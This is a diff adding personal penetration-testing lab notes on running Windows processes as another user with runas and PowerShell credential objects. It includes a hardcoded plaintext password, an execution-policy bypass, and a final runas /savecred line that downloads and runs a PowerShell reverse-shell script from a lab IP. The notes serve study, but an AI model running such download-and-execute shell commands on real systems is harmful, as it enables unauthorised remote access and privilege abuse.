@@ -251,8 +251,59 @@ Kerberos ticket granting ticket account has to get his hashes dump
 https://tryhackme.com/module/privilege-escalation
 
 
+# users trying mimikatz
 
-
-```
 runas commands with mimikatz
+
 ```
+C:\Users\m>runas /user:WIN10RED "powershell calc.exe"
+Enter the password for WIN10RED:
+Attempting to start powershell calc.exe as user "DESKTOP-ATB3U19\WIN10RED"
+```
+
+needs a new window
+
+```powershell
+$username = 'user'
+$password = 'password'
+
+$securePassword = ConvertTo-SecureString $password -AsPlainText -Force
+$credential = New-Object System.Management.Automation.PSCredential $username, $securePassword
+Start-Process Notepad.exe -Credential $credential
+```
+
+anotherone - this works
+
+```
+$secpasswd = ConvertTo-SecureString "WinR3d@" -AsPlainText -Force
+$mycreds = New-Object System.Management.Automation.PSCredential ("WIN10RED", $secpasswd)
+$computer = "DESKTOP-ATB3U19"
+[System.Diagnostics.Process]::Start("powershell -ep bypass -file C:\Users\m\new.ps1","", $mycreds.Username, $mycreds.Password, $computer)
+```
+
+```
+ start-process -FilePath "powershell.exe" -Verb runas /user:win10red
+```
+
+remotely invoking powershell
+
+doesn't work
+
+```
+
+C:\Program Files (x86)\Microsoft Visual Studio 14.0\VC>cmd /k hostname
+DESKTOP-ATB3U19
+
+PS C:\Windows\System32> Enter-PSSession DESKTOP-ATB3U19 -credential (get-credential -username WIN10RED)
+
+cmdlet Get-Credential at command pipeline position 1
+Supply values for the following parameters:
+Message: WinR3d@
+
+```
+
+```
+runas /user:ACCESS\Administrator /savecred "powershell -c IEX (New-Object net.webclient).downloadstring('http://10.10.14.6/Invoke-PowerShellTcp.ps1')"
+```
+
+
